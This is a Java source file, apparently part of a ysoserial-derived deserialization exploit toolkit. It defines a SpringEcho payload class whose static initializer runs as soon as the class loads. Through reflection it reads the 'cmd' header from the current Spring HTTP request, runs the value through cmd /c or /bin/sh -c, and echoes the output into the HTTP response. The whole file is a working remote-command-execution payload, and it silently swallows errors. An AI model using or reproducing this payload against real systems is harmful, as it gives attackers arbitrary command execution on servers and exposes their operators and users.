package ysoserial.bullet.template.spring;

import java.lang.reflect.Method;
import java.util.Scanner;

public class SpringEcho {
    public SpringEcho() {
    }

    static {
        try {
            Class var0 = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder");
            Method var1 = var0.getMethod("getRequestAttributes");
            Object var2 = var1.invoke((Object)null);
            var0 = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.ServletRequestAttributes");
            var1 = var0.getMethod("getResponse");
            Method var3 = var0.getMethod("getRequest");
            Object var4 = var1.invoke(var2);
            Object var5 = var3.invoke(var2);
            Method var6 = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.ServletResponse").getDeclaredMethod("getWriter");
            Method var7 = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.http.HttpServletRequest").getDeclaredMethod("getHeader", String.class);
            var7.setAccessible(true);
            var6.setAccessible(true);
            Object var8 = var6.invoke(var4);
            String var9 = (String)var7.invoke(var5, "cmd");
            String[] var10 = new String[3];
            if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
                var10[0] = "cmd";
                var10[1] = "/c";
            } else {
                var10[0] = "/bin/sh";
                var10[1] = "-c";
            }

            var10[2] = var9;
            var8.getClass().getDeclaredMethod("println", String.class).invoke(var8, (new Scanner(Runtime.getRuntime().exec(var10).getInputStream())).useDelimiter("\\A").next());
            var8.getClass().getDeclaredMethod("flush").invoke(var8);
            var8.getClass().getDeclaredMethod("close").invoke(var8);
        } catch (Exception var11) {
        }

    }
}
